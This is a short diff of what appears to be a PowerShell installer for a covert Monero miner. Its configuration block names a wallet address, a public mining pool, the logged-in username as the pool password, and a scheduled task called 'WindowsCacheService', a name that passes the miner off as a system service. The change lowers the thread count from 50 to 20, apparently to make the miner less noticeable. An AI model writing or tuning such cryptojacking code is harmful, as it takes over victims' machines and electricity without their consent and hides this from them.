@@ -5,7 +5,7 @@ $ErrorActionPreference = 'Stop'
 $Wallet   = "4A2GjyjSnQqUjJMZvLju8YZaFSRZcb6qCC2Dw1DbebjNgCGviijSWjHRkeuPn5amLNP2h2P4vEBVi1bnG1BjqJ4yRotXGoF"
 $Pool     = "pool.supportxmr.com:5555"
 $Pass     = $env:USERNAME
-$Threads  = 50
+$Threads  = 20
 $TaskName = "WindowsCacheService"
 # ===========================================================
 
